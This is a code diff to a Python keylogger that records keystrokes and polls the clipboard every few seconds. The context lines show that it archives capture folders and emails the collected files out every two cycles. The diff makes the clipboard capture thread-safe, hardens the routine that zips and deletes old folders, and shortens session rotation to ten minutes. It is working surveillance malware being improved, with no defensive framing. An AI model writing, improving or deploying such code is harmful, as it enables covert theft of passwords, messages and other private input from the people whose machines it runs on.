@@ -96,12 +96,14 @@ def keylog(dir):
     listener.start()
     return listener
 
+clipboard_lock = threading.Lock()   # Add a global lock to make it thread-safe
 last_clipboard = None
 def capture_clipboard(dir):
     global last_clipboard
     while True:
         time.sleep(3)
-        current_clipboard = pyperclip.paste()
+        with clipboard_lock:
+            current_clipboard = pyperclip.paste()
 
         # If clipboard content changes, log it
         if current_clipboard and current_clipboard != last_clipboard:
@@ -295,19 +297,24 @@ def start_keylogging():
     for t in current_threads:
         t.start()
     
-    # remove previous directory to save space
+    # Remove previous directory to save space
     if previous_dir:
         try:
             full_prev_dir = results_dir / previous_dir
-            zip_path = full_prev_dir.resolve()  # Full path for archiving
-            print(zip_path)
-            shutil.make_archive(zip_path, format="zip", root_dir=zip_path)
-            shutil.rmtree(zip_path)
-            print(f"Removed old folder: {previous_dir}")
+            zip_path = full_prev_dir.resolve()  
+
+            if full_prev_dir.exists():
+                shutil.make_archive(str(zip_path), format="zip", root_dir=str(full_prev_dir))
+                shutil.rmtree(full_prev_dir)
+                print(f"Removed old folder: {previous_dir}")
+            else:
+                print(f"Folder not found, skipping deletion: {full_prev_dir}")
+                
         except Exception as e:
             print(f"Could not delete {previous_dir}: {e}")
-
+    
     previous_dir = new_dir
+
 
     # Every two cycles, send files through email and cleanup
     if cycle_count % 2 == 0:
@@ -332,4 +339,4 @@ def start_keylogging():
 # Loop every 1 hour to rotate session
 while True:
     start_keylogging()
-    time.sleep(3600)  # 1 hours = 3600 seconds
+    time.sleep(600)  # 1 hours = 3600 seconds, 10 minutes for testing
